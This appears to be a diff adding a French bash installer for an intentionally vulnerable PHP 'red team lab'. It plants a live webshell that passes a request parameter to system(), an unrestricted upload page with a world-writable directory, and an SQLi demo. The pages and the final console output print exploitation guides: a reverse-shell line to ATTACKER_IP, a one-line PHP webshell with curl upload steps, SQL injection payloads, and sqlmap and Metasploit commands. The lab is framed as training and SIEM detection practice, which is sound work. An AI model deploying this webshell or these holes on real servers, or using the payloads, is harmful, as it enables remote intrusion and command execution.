@@ -1,0 +1,522 @@
+#!/bin/bash
+
+###############################################################################
+# Iron4Software Red Team Lab - Installation Vulnérabilités PHP
+# Description: Déploie des vulnérabilités PHP exploitables
+# Usage: sudo ./install_php_vulnerabilities.sh
+###############################################################################
+
+set -e
+
+echo "========================================================"
+echo "  Iron4Software Lab - Vulnérabilités PHP"
+echo "========================================================"
+echo ""
+
+# Vérifier qu'on est root
+if [ "$EUID" -ne 0 ]; then 
+    echo "❌ Ce script doit être exécuté en tant que root (sudo)"
+    exit 1
+fi
+
+# Variables
+WEB_ROOT="/var/www/html"
+VULN_DIR="$WEB_ROOT/lab"
+UPLOAD_DIR="$WEB_ROOT/uploads"
+
+echo "[1/6] Création des répertoires..."
+mkdir -p "$VULN_DIR"
+mkdir -p "$UPLOAD_DIR"
+chmod 777 "$UPLOAD_DIR"
+echo "✅ Répertoires créés"
+
+echo "[2/6] Installation webshell simple..."
+cat > "$VULN_DIR/cmd.php" << 'SHELL_EOF'
+<?php
+/**
+ * Iron4Software Lab - Command Execution Vulnerability
+ * CVE: Simulated Remote Code Execution
+ * MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
+ */
+
+header('X-Lab: Iron4Software');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lab Iron4Software - CMD</title>
+    <style>
+        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
+        input[type="text"] { width: 80%; padding: 10px; background: #2d2d2d; color: #00ff00; border: 1px solid #00ff00; }
+        input[type="submit"] { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
+        pre { background: #000; padding: 20px; border: 1px solid #00ff00; }
+        .warning { color: #ff0000; padding: 10px; border: 1px solid #ff0000; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>🔓 Iron4Software Lab - Command Execution</h1>
+    <div class="warning">⚠️ VULNERABLE ENDPOINT - Educational Lab Only</div>
+    
+    <form method="GET">
+        <input type="text" name="c" placeholder="Enter command (e.g., whoami, ls -la, id)" value="<?php echo htmlspecialchars($_GET['c'] ?? ''); ?>">
+        <input type="submit" value="Execute">
+    </form>
+    
+    <?php
+    if(isset($_GET['c'])) {
+        echo "<h2>Output:</h2>";
+        echo "<pre>";
+        system($_GET['c']);
+        echo "</pre>";
+    }
+    ?>
+    
+    <hr>
+    <p><strong>Exploitation examples:</strong></p>
+    <ul>
+        <li>Metasploit: exploit/multi/http/php_cgi_arg_injection</li>
+        <li>Direct: curl "http://TARGET/lab/cmd.php?c=whoami"</li>
+        <li>Reverse shell: bash -c 'bash -i &gt;/dev/tcp/ATTACKER_IP/4444 0&gt;&1'</li>
+    </ul>
+</body>
+</html>
+SHELL_EOF
+
+chmod 644 "$VULN_DIR/cmd.php"
+echo "✅ Webshell créé: $VULN_DIR/cmd.php"
+
+echo "[3/6] Installation upload vulnérable..."
+cat > "$VULN_DIR/upload.php" << 'UPLOAD_EOF'
+<?php
+/**
+ * Iron4Software Lab - Unrestricted File Upload Vulnerability
+ * CVE: Simulated Arbitrary File Upload
+ * MITRE ATT&CK: T1105 (Ingress Tool Transfer)
+ */
+
+header('X-Lab: Iron4Software');
+$upload_success = false;
+$upload_path = '';
+
+if(isset($_FILES['file'])) {
+    $target = "/var/www/html/uploads/" . basename($_FILES['file']['name']);
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        $upload_success = true;
+        $upload_path = "/uploads/" . basename($_FILES['file']['name']);
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lab Iron4Software - Upload</title>
+    <style>
+        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #e74c3c; }
+        .warning { background: #ffe6e6; padding: 15px; border-left: 4px solid #e74c3c; margin: 20px 0; }
+        .success { background: #d4edda; padding: 15px; border-left: 4px solid #28a745; margin: 20px 0; }
+        input[type="file"] { padding: 10px; }
+        input[type="submit"] { padding: 10px 20px; background: #e74c3c; color: white; border: none; cursor: pointer; }
+        code { background: #2c3e50; color: #ecf0f1; padding: 2px 6px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📤 Iron4Software Lab - File Upload</h1>
+        
+        <div class="warning">
+            ⚠️ <strong>UNRESTRICTED FILE UPLOAD VULNERABILITY</strong><br>
+            No file type validation - Educational lab only
+        </div>
+        
+        <?php if($upload_success): ?>
+        <div class="success">
+            ✅ File uploaded successfully!<br>
+            Access: <a href="<?php echo $upload_path; ?>" target="_blank"><?php echo $upload_path; ?></a>
+        </div>
+        <?php endif; ?>
+        
+        <form method="POST" enctype="multipart/form-data">
+            <h3>Upload File:</h3>
+            <input type="file" name="file" required>
+            <input type="submit" value="Upload">
+        </form>
+        
+        <hr>
+        
+        <h3>🎯 Exploitation Guide:</h3>
+        <p><strong>1. Create malicious PHP file:</strong></p>
+        <code>echo '&lt;?php system($_GET["x"]); ?&gt;' &gt; shell.php</code>
+        
+        <p><strong>2. Upload via curl:</strong></p>
+        <code>curl -F "file=@shell.php" http://TARGET/lab/upload.php</code>
+        
+        <p><strong>3. Execute uploaded shell:</strong></p>
+        <code>curl "http://TARGET/uploads/shell.php?x=id"</code>
+        
+        <h3>📋 MITRE ATT&CK Techniques:</h3>
+        <ul>
+            <li><strong>T1105</strong> - Ingress Tool Transfer</li>
+            <li><strong>T1059</strong> - Command and Scripting Interpreter</li>
+            <li><strong>T1083</strong> - File and Directory Discovery</li>
+        </ul>
+    </div>
+</body>
+</html>
+UPLOAD_EOF
+
+chmod 644 "$VULN_DIR/upload.php"
+echo "✅ Upload vulnérable créé: $VULN_DIR/upload.php"
+
+echo "[4/6] Installation page d'information SQLi..."
+cat > "$VULN_DIR/sqli.php" << 'SQLI_EOF'
+<?php
+/**
+ * Iron4Software Lab - SQL Injection Demo
+ * Note: Simplified demo without actual database
+ * MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
+ */
+
+header('X-Lab: Iron4Software');
+$username = $_GET['user'] ?? '';
+$vulnerable_query = '';
+
+if($username) {
+    // Simulate vulnerable query construction
+    $vulnerable_query = "SELECT * FROM users WHERE username = '$username'";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lab Iron4Software - SQLi</title>
+    <style>
+        body { font-family: Arial; background: #2c3e50; color: #ecf0f1; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #34495e; padding: 30px; border-radius: 8px; }
+        h1 { color: #e74c3c; }
+        input[type="text"] { width: 70%; padding: 10px; background: #2c3e50; color: #ecf0f1; border: 1px solid #3498db; }
+        input[type="submit"] { padding: 10px 20px; background: #e74c3c; color: white; border: none; cursor: pointer; }
+        .query { background: #1a252f; padding: 15px; border-left: 4px solid #3498db; margin: 20px 0; font-family: monospace; }
+        .payload { background: #1a252f; padding: 10px; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🗄️ Iron4Software Lab - SQL Injection</h1>
+        
+        <p><strong>Vulnerable Login Form (Demo)</strong></p>
+        
+        <form method="GET">
+            <input type="text" name="user" placeholder="Username" value="<?php echo htmlspecialchars($username); ?>">
+            <input type="submit" value="Login">
+        </form>
+        
+        <?php if($vulnerable_query): ?>
+        <h3>Executed Query:</h3>
+        <div class="query"><?php echo htmlspecialchars($vulnerable_query); ?></div>
+        <?php endif; ?>
+        
+        <hr>
+        
+        <h3>🎯 SQL Injection Payloads:</h3>
+        <div class="payload"><strong>Basic bypass:</strong> admin' OR '1'='1</div>
+        <div class="payload"><strong>Union select:</strong> admin' UNION SELECT null,null,null--</div>
+        <div class="payload"><strong>Time-based:</strong> admin' AND SLEEP(5)--</div>
+        <div class="payload"><strong>Error-based:</strong> admin' AND 1=CONVERT(int,@@version)--</div>
+        
+        <h3>🛠️ Tools:</h3>
+        <ul>
+            <li>sqlmap -u "http://TARGET/lab/sqli.php?user=admin" --batch</li>
+            <li>Burp Suite + SQLi scanner</li>
+            <li>Manual exploitation</li>
+        </ul>
+    </div>
+</body>
+</html>
+SQLI_EOF
+
+chmod 644 "$VULN_DIR/sqli.php"
+echo "✅ SQLi demo créé: $VULN_DIR/sqli.php"
+
+echo "[5/6] Création page d'index du lab..."
+cat > "$VULN_DIR/index.html" << 'INDEX_EOF'
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iron4Software - Red Team Lab</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
+        .badge {
+            display: inline-block;
+            padding: 8px 16px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            margin: 5px;
+            font-size: 0.9em;
+        }
+        .content { padding: 40px; }
+        .warning {
+            background: #ffe6e6;
+            border-left: 5px solid #e74c3c;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+        .vuln-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .vuln-card {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 25px;
+            border-left: 4px solid #667eea;
+            transition: transform 0.2s;
+        }
+        .vuln-card:hover { transform: translateY(-5px); }
+        .vuln-card h3 { color: #2c3e50; margin-bottom: 15px; }
+        .vuln-card a {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background 0.2s;
+        }
+        .vuln-card a:hover { background: #764ba2; }
+        .techniques {
+            background: #e8f4f8;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+        }
+        .techniques h3 { color: #2c3e50; margin-bottom: 15px; }
+        .technique-item {
+            padding: 10px;
+            margin: 10px 0;
+            background: white;
+            border-left: 3px solid #3498db;
+            border-radius: 4px;
+        }
+        code {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        footer {
+            background: #2c3e50;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 Iron4Software Red Team Lab</h1>
+            <p style="font-size: 1.2em; margin: 15px 0;">Environnement de test pour techniques d'exploitation</p>
+            <div>
+                <span class="badge">🎯 Vulnerable by Design</span>
+                <span class="badge">📚 Educational Only</span>
+                <span class="badge">🛡️ Monitored by SIEM</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="warning">
+                <h2>⚠️ AVERTISSEMENT DE SÉCURITÉ</h2>
+                <p style="margin-top: 10px;">
+                    Ce serveur contient des vulnérabilités <strong>intentionnelles</strong> pour des tests de pénétration 
+                    en environnement contrôlé. <strong>NE JAMAIS</strong> exposer sur Internet ou utiliser en production.
+                </p>
+            </div>
+
+            <h2 style="color: #2c3e50; margin-bottom: 20px;">🎯 Vulnérabilités Disponibles</h2>
+
+            <div class="vuln-grid">
+                <div class="vuln-card">
+                    <h3>💻 Remote Code Execution</h3>
+                    <p><strong>Type:</strong> Command Injection</p>
+                    <p><strong>Criticité:</strong> 🔴 Critique</p>
+                    <p><strong>Technique:</strong> T1059</p>
+                    <p style="margin-top: 10px; font-size: 0.9em;">
+                        Webshell permettant l'exécution de commandes système arbitraires.
+                    </p>
+                    <a href="cmd.php">Accéder au Webshell</a>
+                </div>
+
+                <div class="vuln-card">
+                    <h3>📤 File Upload</h3>
+                    <p><strong>Type:</strong> Unrestricted Upload</p>
+                    <p><strong>Criticité:</strong> 🔴 Critique</p>
+                    <p><strong>Technique:</strong> T1105</p>
+                    <p style="margin-top: 10px; font-size: 0.9em;">
+                        Upload de fichiers sans validation. Permet l'upload de webshells PHP.
+                    </p>
+                    <a href="upload.php">Tester l'Upload</a>
+                </div>
+
+                <div class="vuln-card">
+                    <h3>🗄️ SQL Injection</h3>
+                    <p><strong>Type:</strong> SQLi (Demo)</p>
+                    <p><strong>Criticité:</strong> 🟠 Élevée</p>
+                    <p><strong>Technique:</strong> T1190</p>
+                    <p style="margin-top: 10px; font-size: 0.9em;">
+                        Interface de démonstration pour tester des payloads SQL injection.
+                    </p>
+                    <a href="sqli.php">Tester SQLi</a>
+                </div>
+            </div>
+
+            <div class="techniques">
+                <h3>🛡️ MITRE ATT&CK Techniques Couvertes</h3>
+                <div class="technique-item">
+                    <strong>T1190</strong> - Exploit Public-Facing Application
+                </div>
+                <div class="technique-item">
+                    <strong>T1059</strong> - Command and Scripting Interpreter
+                </div>
+                <div class="technique-item">
+                    <strong>T1105</strong> - Ingress Tool Transfer
+                </div>
+                <div class="technique-item">
+                    <strong>T1083</strong> - File and Directory Discovery
+                </div>
+            </div>
+
+            <h2 style="color: #2c3e50; margin: 30px 0 20px 0;">🔥 Exploitation avec Metasploit</h2>
+            <div style="background: #1e1e1e; color: #00ff00; padding: 20px; border-radius: 8px; font-family: monospace;">
+                <p># Webshell RCE</p>
+                <p>use exploit/multi/http/php_cgi_arg_injection</p>
+                <p>set RHOSTS mail.iron4software.local</p>
+                <p>set TARGETURI /lab/cmd.php</p>
+                <p>exploit</p>
+                <br>
+                <p># Direct curl</p>
+                <p>curl "http://mail.iron4software.local/lab/cmd.php?c=whoami"</p>
+            </div>
+
+            <h2 style="color: #2c3e50; margin: 30px 0 20px 0;">📊 Objectifs du Lab</h2>
+            <ul style="line-height: 2; margin-left: 20px;">
+                <li>✅ Tester les exploits de vulnérabilités web</li>
+                <li>✅ Valider la détection du SIEM Splunk</li>
+                <li>✅ Pratiquer la réponse aux incidents</li>
+                <li>✅ Analyser les artefacts d'attaque</li>
+                <li>✅ Documenter la kill chain complète</li>
+            </ul>
+        </div>
+
+        <footer>
+            <p><strong>Iron4Software - Red Team Lab Environment</strong></p>
+            <p style="margin-top: 10px; opacity: 0.8;">Projet Cybersécurité AIS - 2026</p>
+            <p style="margin-top: 10px; font-size: 0.9em;"><em>For educational and authorized testing purposes only</em></p>
+        </footer>
+    </div>
+</body>
+</html>
+INDEX_EOF
+
+chmod 644 "$VULN_DIR/index.html"
+echo "✅ Page d'index créée: $VULN_DIR/index.html"
+
+echo "[6/6] Configuration finale..."
+chown -R www-data:www-data "$WEB_ROOT"
+echo "✅ Permissions configurées"
+
+# Récupération des infos serveur
+SERVER_IP=$(hostname -I | awk '{print $1}')
+HOSTNAME=$(hostname)
+
+# Test rapide
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/lab/ 2>/dev/null || echo "000")
+
+echo ""
+echo "========================================================"
+echo "  ✅ Installation terminée avec succès !"
+echo "========================================================"
+echo ""
+echo "📊 Informations du serveur :"
+echo "   Hostname      : $HOSTNAME"
+echo "   IP            : $SERVER_IP"
+echo "   Web Root      : $WEB_ROOT"
+echo ""
+echo "🎯 Vulnérabilités installées :"
+echo "   1. Webshell RCE    : http://$SERVER_IP/lab/cmd.php"
+echo "   2. File Upload     : http://$SERVER_IP/lab/upload.php"
+echo "   3. SQLi Demo       : http://$SERVER_IP/lab/sqli.php"
+echo "   4. Index           : http://$SERVER_IP/lab/"
+echo ""
+echo "🧪 Tests rapides :"
+echo "   Local : curl http://localhost/lab/"
+echo "   Remote: curl http://$SERVER_IP/lab/"
+echo "   Webshell: curl 'http://localhost/lab/cmd.php?c=whoami'"
+echo ""
+
+if [ "$HTTP_CODE" = "200" ]; then
+    echo "✅ Le serveur répond correctement (HTTP 200)"
+else
+    echo "⚠️  Le serveur ne répond pas comme prévu (HTTP $HTTP_CODE)"
+fi
+
+echo ""
+echo "========================================================"
+echo "  🔥 EXPLOITATION DEPUIS KALI"
+echo "========================================================"
+echo ""
+echo "1️⃣  Configurer pfSense Port Forwarding :"
+echo "    Interface: KALI → Port 80 → $SERVER_IP:80"
+echo ""
+echo "2️⃣  Tester depuis Kali :"
+echo "    curl http://mail.iron4software.local/lab/"
+echo ""
+echo "3️⃣  Exploitation RCE :"
+echo "    curl 'http://mail.iron4software.local/lab/cmd.php?c=id'"
+echo ""
+echo "4️⃣  Upload webshell :"
+echo "    echo '<?php system(\$_GET[\"x\"]); ?>' > shell.php"
+echo "    curl -F 'file=@shell.php' http://mail.iron4software.local/lab/upload.php"
+echo "    curl 'http://mail.iron4software.local/uploads/shell.php?x=id'"
+echo ""
+echo "5️⃣  Metasploit :"
+echo "    msfconsole -q"
+echo "    use exploit/multi/http/php_cgi_arg_injection"
+echo "    set RHOSTS mail.iron4software.local"
+echo "    set TARGETURI /lab/cmd.php"
+echo "    set LHOST 192.168.100.10"
+echo "    set LPORT 4444"
+echo "    exploit"
+echo ""
+echo "========================================================"
+echo "  🛡️ Lab Iron4Software - Prêt pour exploitation !"
+echo "========================================================"
